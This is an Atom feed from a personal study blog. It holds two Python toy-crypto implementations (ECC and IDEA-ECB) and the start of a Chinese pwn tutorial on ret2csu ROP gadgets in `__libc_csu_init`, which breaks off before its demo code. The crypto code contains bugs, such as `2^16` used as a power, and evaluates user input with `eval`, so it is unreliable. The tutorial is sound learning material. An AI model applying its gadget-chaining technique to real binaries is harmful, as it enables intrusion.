<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>汐白的学习档案</title>
  
  <subtitle>小萌新一枚QAQ</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://xibai.xyz/"/>
  <updated>2020-04-29T17:17:51.315Z</updated>
  <id>http://xibai.xyz/</id>
  
  <author>
    <name>Ximu</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>(密码学)(crypto)ECC_Crypto(椭圆曲线加密)——python实现</title>
    <link href="http://xibai.xyz/2020/04/30/(crypto)ECC_Crypto/"/>
    <id>http://xibai.xyz/2020/04/30/(crypto)ECC_Crypto/</id>
    <published>2020-04-29T17:14:37.531Z</published>
    <updated>2020-04-29T17:17:51.315Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,bytes_to_long</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># 辗转相除求最大公因数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">div_fac</span><span class="params">( a, b )</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b !=  <span class="number">0</span>:</span><br><span class="line">        result = div_fac( b, a % b )</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = a</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将负数结果转化为正数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_neg</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> a &lt;= <span class="number">0</span>:</span><br><span class="line">        a += b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="comment"># ECC加密中的加法运算实现</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ECC_Add</span><span class="params">( A , B , p , a)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> A != B:</span><br><span class="line">        dx = A[<span class="number">0</span>] - B[<span class="number">0</span>]</span><br><span class="line">        dy = A[<span class="number">1</span>] - B[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dy = <span class="number">3</span> * ( A[<span class="number">0</span>] ** <span class="number">2</span> ) + a</span><br><span class="line">        dx = <span class="number">2</span> * A[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> dx == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    fac = div_fac( dx , dy )</span><br><span class="line">    dy //= fac</span><br><span class="line">    dx //= fac</span><br><span class="line">    tmp = dy % p</span><br><span class="line">    check_neg( tmp , p )</span><br><span class="line">    <span class="keyword">while</span> tmp % dx != <span class="number">0</span>:</span><br><span class="line">        tmp += p</span><br><span class="line">    k = tmp // dx</span><br><span class="line">    C_x = ( k ** <span class="number">2</span> - A[<span class="number">0</span>] - B[<span class="number">0</span>] ) % p</span><br><span class="line">    check_neg( C_x , p )</span><br><span class="line">    C_y = ( k * ( A[<span class="number">0</span>] - C_x ) - A[<span class="number">1</span>] ) % p</span><br><span class="line">    check_neg( C_y , p )</span><br><span class="line">    <span class="keyword">return</span> (C_x,C_y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求基点的阶</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Find_Order</span><span class="params">( G , p , a )</span>:</span></span><br><span class="line">    flag = <span class="number">1</span> ; A = G ; B = G</span><br><span class="line">    <span class="keyword">while</span> flag :</span><br><span class="line">        flag += <span class="number">1</span></span><br><span class="line">        A = ECC_Add(A,B,p,a)</span><br><span class="line">        <span class="keyword">if</span> (( A[<span class="number">0</span>] ** <span class="number">3</span> + A[<span class="number">0</span>] + <span class="number">1</span> ) % p ) == (( A[<span class="number">1</span>] ** <span class="number">2</span> ) % p ):</span><br><span class="line">            <span class="keyword">if</span> A[<span class="number">0</span>] == G[<span class="number">0</span>]:</span><br><span class="line">                <span class="keyword">return</span> flag + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"Error!!!"</span>)</span><br><span class="line">            print(<span class="string">"在第 "</span> + str(flag) + <span class="string">" 次运算后结果错误！"</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 求取公钥</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ECC_PublickeyFind</span><span class="params">(p,a,G,d)</span>:</span></span><br><span class="line">    A = G ; B = G</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; d:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        A = ECC_Add(A,B,p,a)</span><br><span class="line">        <span class="keyword">if</span> A == <span class="number">0</span>:</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            A = G</span><br><span class="line">    <span class="keyword">return</span> A</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将明文嵌入曲线</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ECC_M</span><span class="params">(m,p,a,b)</span>:</span></span><br><span class="line">    M = bytes_to_long(m.encode(<span class="string">'utf-8'</span>)) * <span class="number">30</span></span><br><span class="line">    <span class="comment">#M = int(m)</span></span><br><span class="line">    tmp = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> tmp &lt; <span class="number">30</span>:</span><br><span class="line">        x = M + tmp</span><br><span class="line">        y_2 = ( x ** <span class="number">3</span> + a * x + b ) % p</span><br><span class="line">        tmp = ( p - <span class="number">1</span> ) / <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> ( y_2 ** tmp) % p == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,p):</span><br><span class="line">                <span class="keyword">if</span> ( i ** <span class="number">2</span> - y_2 ) % p == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">return</span> ( x , i )</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ECC_encode</span><span class="params">(M,G,K,r,p,a)</span>:</span></span><br><span class="line">    r_G = ECC_PublickeyFind(p,a,G,r)</span><br><span class="line">    r_K = ECC_PublickeyFind(p,a,K,r)</span><br><span class="line">    C_1 = ECC_Add(M,r_K,p,a)</span><br><span class="line">    print(<span class="string">"C1为:"</span> + str(C_1))</span><br><span class="line">    print(<span class="string">"C2为:"</span> + str(r_G))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ECC_Encrypt</span><span class="params">(p,a,b,G,n,d,m)</span>:</span></span><br><span class="line">    K = ECC_PublickeyFind(p,a,G,d)</span><br><span class="line">    print(<span class="string">"公钥为："</span> + str(K))</span><br><span class="line">    M = ECC_M(m,p,a,b)</span><br><span class="line">    <span class="comment">#M = int(m)</span></span><br><span class="line">    <span class="comment">#print(M)</span></span><br><span class="line">    r = random.randint(<span class="number">1</span>,n<span class="number">-1</span>)</span><br><span class="line">    <span class="comment">#r = 2</span></span><br><span class="line">    ECC_encode(M,G,K,r,p,a)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ECC_Decrypt</span><span class="params">(C1,C2,d,p,a)</span>:</span></span><br><span class="line">    C2_tmp = ECC_PublickeyFind(p,a,C2,d)</span><br><span class="line">    C2 = (C2_tmp[<span class="number">0</span>],-C2_tmp[<span class="number">1</span>])</span><br><span class="line">    M = ECC_Add(C1,C2,p,a)</span><br><span class="line">    print(M)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    p,a,b,G,n = <span class="number">23</span>,<span class="number">1</span>,<span class="number">1</span>,(<span class="number">0</span>,<span class="number">1</span>),<span class="number">28</span></span><br><span class="line">    print(<span class="string">"本程序使用曲线方程为：y^2 = x^3 + x + 1"</span>)</span><br><span class="line">    print(<span class="string">"参数 p 选择为 23，基点为 (0,1), n 为 28"</span>)</span><br><span class="line">    d = eval(input(<span class="string">"请输入私钥："</span>))</span><br><span class="line">    m = input(<span class="string">"请输入要加密的数据："</span>)</span><br><span class="line"></span><br><span class="line">    ECC_Encrypt(p,a,b,G,n,d,m)</span><br><span class="line"></span><br><span class="line">    C1 = eval(input(<span class="string">"请输入C1:"</span>))</span><br><span class="line">    C2 = eval(input(<span class="string">"请输入C2:"</span>))</span><br><span class="line"></span><br><span class="line">    ECC_Decrypt(C1,C2,d,p,a)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        
        
          
        
      
    
    </summary>
    
    
      <category term="Crypto" scheme="http://xibai.xyz/categories/Crypto/"/>
    
    
      <category term="Crypto" scheme="http://xibai.xyz/tags/Crypto/"/>
    
      <category term="python" scheme="http://xibai.xyz/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>(密码学)(crypto)IDEA_Crypto(ECB模式)——python实现</title>
    <link href="http://xibai.xyz/2020/04/30/(crypto)IDEA_Crypto(ECB)/"/>
    <id>http://xibai.xyz/2020/04/30/(crypto)IDEA_Crypto(ECB)/</id>
    <published>2020-04-29T17:10:44.768Z</published>
    <updated>2020-04-29T17:17:51.316Z</updated>
    
    <content type="html"><![CDATA[<pre><code class="python"><span class="comment"># -*- coding:utf-8 -*-</span><span class="function"><span class="keyword">def</span> <span class="title">FindMODreverse</span><span class="params">(a,m)</span>:</span>                        <span class="comment"># 欧几里得除法求模逆元</span>    m_tmp = m    x_1,x_2 = <span class="number">1</span>,<span class="number">0</span>    y_1,y_2 = <span class="number">0</span>,<span class="number">1</span>    <span class="keyword">while</span> m != <span class="number">0</span>:        q = a//m        x_2,y_2,m,x_1,y_1,a = (x_1 - q * x_2),(y_1 - q * y_2),a % m,x_2,y_2,m    <span class="keyword">while</span> x_1 &lt; <span class="number">0</span>:        x_1 += m_tmp    <span class="keyword">while</span> x_1 &gt;= m_tmp:        x_1 -= m_tmp    <span class="keyword">return</span> x_1<span class="function"><span class="keyword">def</span> <span class="title">ROL</span><span class="params">(lit,num)</span>:</span>                               <span class="comment"># 循环左移 num 位</span>    <span class="keyword">return</span> lit[num:] + lit[:num]<span class="function"><span class="keyword">def</span> <span class="title">idea_xor</span><span class="params">(x,y)</span>:</span>                              <span class="comment"># 逐位异或</span>    tmp = <span class="string">''</span> ; i = <span class="number">0</span>    <span class="keyword">while</span> <span class="literal">True</span>:        <span class="keyword">try</span>:            tmp += str(int(x[i],<span class="number">2</span>)^int(y[i],<span class="number">2</span>))            i += <span class="number">1</span>        <span class="keyword">except</span>:            <span class="keyword">return</span> tmp<span class="function"><span class="keyword">def</span> <span class="title">idea_add</span><span class="params">(x,y)</span>:</span>                              <span class="comment"># 模65536相加</span>    x = int(x,<span class="number">2</span>) ; y = int(y,<span class="number">2</span>)    z = ( x + y ) % <span class="number">65536</span>    z = bin(z)[<span class="number">2</span>:]    tmp = <span class="string">'0'</span>*(<span class="number">16</span> - len(z)) + z    <span class="keyword">return</span> tmp<span class="function"><span class="keyword">def</span> <span class="title">idea_mul</span><span class="params">(x,y)</span>:</span>                              <span class="comment"># 模65537相乘</span>    x = int(x,<span class="number">2</span>) ; y = int(y,<span class="number">2</span>)    <span class="keyword">if</span> x == <span class="number">0</span>:        x = <span class="number">2</span>^<span class="number">16</span>    <span class="keyword">if</span> y == <span class="number">0</span>:        y = <span class="number">2</span>^<span class="number">16</span>    z = ( ( x * y ) % <span class="number">65537</span> ) % <span class="number">65536</span>    z = bin(z)[<span class="number">2</span>:]    tmp = <span class="string">'0'</span>*(<span class="number">16</span> - len(z)) + z    <span class="keyword">return</span> tmp<span class="function"><span class="keyword">def</span> <span class="title">idea_encode</span><span class="params">(m,num,key)</span>:</span>                     <span class="comment"># 加密过程</span>    x_array = [m[i*<span class="number">16</span>:i*<span class="number">16</span>+<span class="number">16</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]    z_array = key[num*<span class="number">6</span>:num*<span class="number">6</span>+<span class="number">6</span>]    <span class="keyword">if</span> num &lt; <span class="number">8</span>:        out_1 = idea_mul(x_array[<span class="number">0</span>],z_array[<span class="number">0</span>])        out_2 = idea_add(x_array[<span class="number">1</span>],z_array[<span class="number">1</span>])        out_3 = idea_add(x_array[<span class="number">2</span>],z_array[<span class="number">2</span>])        out_4 = idea_mul(x_array[<span class="number">3</span>],z_array[<span class="number">3</span>])        out_5 = idea_mul(z_array[<span class="number">4</span>],idea_xor(out_1,out_3))        out_6 = idea_mul(z_array[<span class="number">5</span>],idea_add(idea_xor(out_2,out_4),out_5))        out_7 = idea_add(out_5,out_6)        w_1 = idea_xor(out_1,out_6)        w_2 = idea_xor(out_3,out_6)        w_3 = idea_xor(out_2,out_7)        w_4 = idea_xor(out_4,out_7)        c = w_1 + w_2 + w_3 + w_4        num += <span class="number">1</span>        c = idea_encode(c,num,key)    <span class="keyword">else</span>:        y_1 = idea_mul(x_array[<span class="number">0</span>],z_array[<span class="number">0</span>])        y_2 = idea_add(x_array[<span class="number">2</span>],z_array[<span class="number">1</span>])        y_3 = idea_add(x_array[<span class="number">1</span>],z_array[<span class="number">2</span>])        y_4 = idea_mul(x_array[<span class="number">3</span>],z_array[<span class="number">3</span>])        c = y_1 + y_2 + y_3 + y_4    <span class="keyword">return</span> c<span class="function"><span class="keyword">def</span> <span class="title">IDEA_Crypto</span><span class="params">(cm_str,key,mode)</span>:</span>    <span class="keyword">if</span> mode == <span class="number">0</span>:        <span class="keyword">if</span> len(cm_str) % <span class="number">8</span> != <span class="number">0</span>:                         <span class="comment"># 对明文进行填充</span>            cm_str += <span class="string">'\x00'</span> * ( <span class="number">8</span> - len(cm_str) % <span class="number">8</span> )        m_bin = <span class="string">''</span>                                       <span class="comment"># 将明文转化为二元序列</span>        <span class="keyword">for</span> i <span class="keyword">in</span> cm_str.encode(<span class="string">'utf-8'</span>):            i = bin(i)[<span class="number">2</span>:]            m_bin += <span class="string">'0'</span>*(<span class="number">8</span> - len(i)) + i    <span class="keyword">else</span>:                                                <span class="comment"># 将密文转化为二元序列</span>        c_bin = bin(int(cm_str,<span class="number">16</span>))[<span class="number">2</span>:]        <span class="keyword">if</span> len(c_bin) % <span class="number">8</span> != <span class="number">0</span>:            c_bin = <span class="string">'0'</span>*(<span class="number">8</span> - (len(c_bin) % <span class="number">8</span>)) + c_bin    key_bin = <span class="string">''</span>                                         <span class="comment"># 将密钥转化为二元序列</span>    <span class="keyword">for</span> i <span class="keyword">in</span> key.encode(<span class="string">'utf-8'</span>):        i = bin(i)[<span class="number">2</span>:]        key_bin += <span class="string">'0'</span>*(<span class="number">8</span> - len(i)) + i    key_encrypt_array = []                                       <span class="comment"># 生成加密子密钥</span>    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):        <span class="keyword">for</span> j <span class="keyword">in</span> [key_bin[k*<span class="number">16</span>:k*<span class="number">16</span>+<span class="number">16</span>] <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">8</span>)]:            key_encrypt_array.append(j)        key_bin = ROL(key_bin,<span class="number">25</span>)    <span class="keyword">else</span>:        key_encrypt_array.extend([key_bin[k*<span class="number">16</span>:k*<span class="number">16</span>+<span class="number">16</span>] <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">8</span>)][:<span class="number">4</span>])    key_decrypt_array = [] ; flag = <span class="number">0</span>                            <span class="comment"># 生成解密子密钥</span>    key_tmp_array = key_encrypt_array[::<span class="number">-1</span>]    <span class="keyword">for</span> i <span class="keyword">in</span> [key_tmp_array[i*<span class="number">6</span>:i*<span class="number">6</span>+<span class="number">6</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>)]:        i[:<span class="number">4</span>] = i[<span class="number">3</span>::<span class="number">-1</span>] ; i[<span class="number">-2</span>:] = i[:<span class="number">-3</span>:<span class="number">-1</span>]        <span class="keyword">if</span> flag == <span class="number">0</span>:                                            <span class="comment"># 第一轮和最后一轮的第二三子密钥特殊取值</span>            Addrev = bin((<span class="number">65536</span> - int(i[<span class="number">1</span>],<span class="number">2</span>)) % <span class="number">65536</span>)[<span class="number">2</span>:]            i[<span class="number">1</span>] = <span class="string">'0'</span>*(<span class="number">16</span>-len(Addrev)) + Addrev            Addrev = bin((<span class="number">65536</span> - int(i[<span class="number">2</span>],<span class="number">2</span>)) % <span class="number">65536</span>)[<span class="number">2</span>:]            i[<span class="number">2</span>] = <span class="string">'0'</span>*(<span class="number">16</span>-len(Addrev)) + Addrev            flag += <span class="number">1</span>        <span class="keyword">else</span>:            Addrev = bin((<span class="number">65536</span> - int(i[<span class="number">1</span>],<span class="number">2</span>)) % <span class="number">65536</span>)[<span class="number">2</span>:]            tmp_1 = <span class="string">'0'</span>*(<span class="number">16</span>-len(Addrev)) + Addrev            Addrev = bin((<span class="number">65536</span> - int(i[<span class="number">2</span>],<span class="number">2</span>)) % <span class="number">65536</span>)[<span class="number">2</span>:]            tmp_2 = <span class="string">'0'</span>*(<span class="number">16</span>-len(Addrev)) + Addrev            i[<span class="number">1</span>] = tmp_2            i[<span class="number">2</span>] = tmp_1        Modrev = bin(FindMODreverse(int(i[<span class="number">0</span>],<span class="number">2</span>),<span class="number">65537</span>))[<span class="number">2</span>:]        i[<span class="number">0</span>] = <span class="string">'0'</span>*(<span class="number">16</span>-len(Modrev)) + Modrev        Modrev = bin(FindMODreverse(int(i[<span class="number">3</span>],<span class="number">2</span>),<span class="number">65537</span>))[<span class="number">2</span>:]        i[<span class="number">3</span>] = <span class="string">'0'</span>*(<span class="number">16</span>-len(Modrev)) + Modrev        key_decrypt_array.extend(i)    <span class="keyword">else</span>:                                                       <span class="comment"># 最后一轮第九轮的解密密钥</span>        i = key_tmp_array[<span class="number">-4</span>:][::<span class="number">-1</span>]        Addrev = bin((<span class="number">65536</span> - int(i[<span class="number">1</span>],<span class="number">2</span>)) % <span class="number">65536</span>)[<span class="number">2</span>:]        i[<span class="number">1</span>] = <span class="string">'0'</span>*(<span class="number">16</span>-len(Addrev)) + Addrev        Addrev = bin((<span class="number">65536</span> - int(i[<span class="number">2</span>],<span class="number">2</span>)) % <span class="number">65536</span>)[<span class="number">2</span>:]        i[<span class="number">2</span>] = <span class="string">'0'</span>*(<span class="number">16</span>-len(Addrev)) + Addrev        Modrev = bin(FindMODreverse(int(i[<span class="number">0</span>],<span class="number">2</span>),<span class="number">65537</span>))[<span class="number">2</span>:]        i[<span class="number">0</span>] = <span class="string">'0'</span>*(<span class="number">16</span>-len(Modrev)) + Modrev        Modrev = bin(FindMODreverse(int(i[<span class="number">3</span>],<span class="number">2</span>),<span class="number">65537</span>))[<span class="number">2</span>:]        i[<span class="number">3</span>] = <span class="string">'0'</span>*(<span class="number">16</span>-len(Modrev)) + Modrev        key_decrypt_array.extend(i)    <span class="keyword">if</span> mode == <span class="number">0</span>:                                   <span class="comment"># 文本二元序列的分组</span>        mc_array = [ m_bin[i*<span class="number">64</span>:i*<span class="number">64</span>+<span class="number">64</span>] \            <span class="keyword">for</span> i <span class="keyword">in</span> range(int(len(m_bin) / <span class="number">64</span>)) ]      <span class="keyword">else</span>:        mc_array = [ c_bin[i*<span class="number">64</span>:i*<span class="number">64</span>+<span class="number">64</span>] \            <span class="keyword">for</span> i <span class="keyword">in</span> range(int(len(c_bin) / <span class="number">64</span>)) ]    cm_array = []                                   <span class="comment"># 求结果分组</span>    <span class="keyword">if</span> mode == <span class="number">0</span>:        <span class="keyword">for</span> i <span class="keyword">in</span> mc_array:            cm_array.append(idea_encode(i,<span class="number">0</span>,key_encrypt_array))    <span class="keyword">else</span>:        <span class="keyword">for</span> i <span class="keyword">in</span> mc_array:            cm_array.append(idea_encode(i,<span class="number">0</span>,key_decrypt_array))    cm = <span class="string">''</span>                                      <span class="comment"># 将结果分组转换为对应的十六进制内容</span>    <span class="keyword">for</span> i <span class="keyword">in</span> cm_array:        tmp = hex(int(i,<span class="number">2</span>))[<span class="number">2</span>:]        <span class="keyword">if</span> len(tmp) * <span class="number">4</span> != len(i):            tmp = <span class="string">'0'</span>*int(len(i) / <span class="number">4</span> - len(tmp)) + tmp        cm += tmp    <span class="keyword">if</span> mode == <span class="number">0</span>:        print(<span class="string">'密文：'</span> + cm)    <span class="keyword">else</span>:        print(<span class="string">'明文(hex):'</span> + cm)    <span class="keyword">return</span> cm<span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:    m = <span class="string">'1234567812345678'</span>    key = <span class="string">'1234567812345678'</span>    c = IDEA_Crypto(m,key,<span class="number">0</span>)    m_tmp = IDEA_Crypto(c,key,<span class="number">1</span>)<span class="string">'''</span></code></pre>]]></content>
    
    <summary type="html">
    
      
      
        
        
          
        
      
    
    </summary>
    
    
      <category term="Crypto" scheme="http://xibai.xyz/categories/Crypto/"/>
    
    
      <category term="Crypto" scheme="http://xibai.xyz/tags/Crypto/"/>
    
      <category term="python" scheme="http://xibai.xyz/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>汐白学Pwn-3.2(ROP-Intermediate)</title>
    <link href="http://xibai.xyz/2020/04/24/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-3.2(ROP)/"/>
    <id>http://xibai.xyz/2020/04/24/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-3.2(ROP)/</id>
    <published>2020-04-24T07:52:13.108Z</published>
    <updated>2020-04-29T17:17:51.691Z</updated>
    
    <content type="html"><![CDATA[<p>前面介绍了栈溢出的基础操作，现在开始应该才算是入门操作了</p><h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><p>我们知道64位的程序，其函数传参时六个参数以内是通过<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>、<code>r9</code>。也就是如果对64位程序进行栈溢出攻击时，我们不是仅仅在栈上布置输入的数据，我们还要找到可以控制以上六个寄存器的<code>gadgets</code>，而正常情况下我们是很难找到六个寄存器各自对应的<code>gadgets</code>。这个时候，就需要用到<code>__libc_csu_init</code>这个函数了。一般情况下的程序在编译时，编译器会自动调用该函数来完成对<code>libc</code>的初始化操作。也就是大多数程序虽然在编写的时候没有用到该函数，但是编译器会自动为其添加该函数，这些程序也因此都会有这个函数。</p><p>下面是我编译的程序反汇编后看到的这个函数的内容：(听说这玩意有很多不同版本，会有一些细节上的不一样，不过大同小异)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">0000000000401190 &lt;__libc_csu_init&gt;:</span><br><span class="line">  401190: 41 57                 push   r15</span><br><span class="line">  401192: 4c 8d 3d df 1f 00 00  lea    r15,[rip+0x1fdf]        # 403178 &lt;__frame_dummy_init_array_entry&gt;</span><br><span class="line">  401199: 41 56                 push   r14</span><br><span class="line">  40119b: 49 89 d6              mov    r14,rdx</span><br><span class="line">  40119e: 41 55                 push   r13</span><br><span class="line">  4011a0: 49 89 f5              mov    r13,rsi</span><br><span class="line">  4011a3: 41 54                 push   r12</span><br><span class="line">  4011a5: 41 89 fc              mov    r12d,edi</span><br><span class="line">  4011a8: 55                    push   rbp</span><br><span class="line">  4011a9: 48 8d 2d d0 1f 00 00  lea    rbp,[rip+0x1fd0]        # 403180 &lt;__do_global_dtors_aux_fini_array_entry&gt;</span><br><span class="line">  4011b0: 53                    push   rbx</span><br><span class="line">  4011b1: 4c 29 fd              sub    rbp,r15</span><br><span class="line">  4011b4: 48 83 ec 08           sub    rsp,0x8</span><br><span class="line">  4011b8: e8 43 fe ff ff        call   401000 &lt;_init&gt;</span><br><span class="line">  4011bd: 48 c1 fd 03           sar    rbp,0x3</span><br><span class="line">  4011c1: 74 1b                 je     4011de &lt;__libc_csu_init+0x4e&gt;</span><br><span class="line">  4011c3: 31 db                 xor    ebx,ebx</span><br><span class="line">  4011c5: 0f 1f 00              nop    DWORD PTR [rax]</span><br><span class="line">  4011c8: 4c 89 f2              mov    rdx,r14</span><br><span class="line">  4011cb: 4c 89 ee              mov    rsi,r13</span><br><span class="line">  4011ce: 44 89 e7              mov    edi,r12d</span><br><span class="line">  4011d1: 41 ff 14 df           call   QWORD PTR [r15+rbx*8]</span><br><span class="line">  4011d5: 48 83 c3 01           add    rbx,0x1</span><br><span class="line">  4011d9: 48 39 dd              cmp    rbp,rbx</span><br><span class="line">  4011dc: 75 ea                 jne    4011c8 &lt;__libc_csu_init+0x38&gt;</span><br><span class="line">  4011de: 48 83 c4 08           add    rsp,0x8</span><br><span class="line">  4011e2: 5b                    pop    rbx</span><br><span class="line">  4011e3: 5d                    pop    rbp</span><br><span class="line">  4011e4: 41 5c                 pop    r12</span><br><span class="line">  4011e6: 41 5d                 pop    r13</span><br><span class="line">  4011e8: 41 5e                 pop    r14</span><br><span class="line">  4011ea: 41 5f                 pop    r15</span><br><span class="line">  4011ec: c3                    ret</span><br></pre></td></tr></table></figure><p>仔细观察一下就可以发现，我们可以通过<code>0x4011e2</code>处的 <strong>pop链</strong> 和 <code>0x4011c8</code>处的 <strong>mov链</strong> 控制程序执行一个已知地址的函数内容。<br>（ps：之所以控制的是<code>edi</code>而不是<code>rdi</code>寄存器却还能用来给函数传参是因为这里<code>rdi</code>寄存器的高三十二位值为0，可以自己编译一个小程序调试查看）<br>并且因为<strong>程序在执行时其实是cpu在执行程序中对应的机器码，所以最后的pop链其实可以通过控制地址偏移来实现不一样的pop链</strong>。<br>比如说，我们劫持<code>rip</code>后，控制地址为<code>0x4011e5</code>，此时将要执行的内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">4011e5: 5c                   pop    rsp</span><br><span class="line">4011e6: 41 5d                pop    r13</span><br><span class="line">4011e8: 41 5e                pop    r14</span><br><span class="line">4011ea: 41 5f                pop    r15</span><br><span class="line">4011ec: c3                   ret</span><br></pre></td></tr></table></figure><p>下面用实例演示对<code>__libc_csu_init</code>中的<code>gadgets</code>的利用:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 